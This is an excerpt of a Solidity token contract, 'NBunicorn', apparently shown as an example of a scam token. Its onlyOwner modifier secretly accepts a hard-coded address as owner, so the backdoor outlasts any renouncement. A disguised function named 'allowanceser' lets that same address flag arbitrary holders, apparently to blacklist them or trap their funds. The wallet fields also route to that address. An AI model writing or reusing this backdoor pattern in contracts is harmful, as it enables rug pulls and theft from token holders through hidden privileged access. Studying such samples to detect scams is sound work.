...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xb89C2d425e18B6D2ee1dcC2359C065d8c5464253) , "Ownable: caller is not the owner");
        _;
    }
...
contract NBunicorn is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NBunicorn";
    string private _symbol = "NBunicorn";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb89C2d425e18B6D2ee1dcC2359C065d8c5464253);
    address payable public teamWalletAddress = payable(0xb89C2d425e18B6D2ee1dcC2359C065d8c5464253);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0xb89C2d425e18B6D2ee1dcC2359C065d8c5464253));
        market[addr] = status;
    }
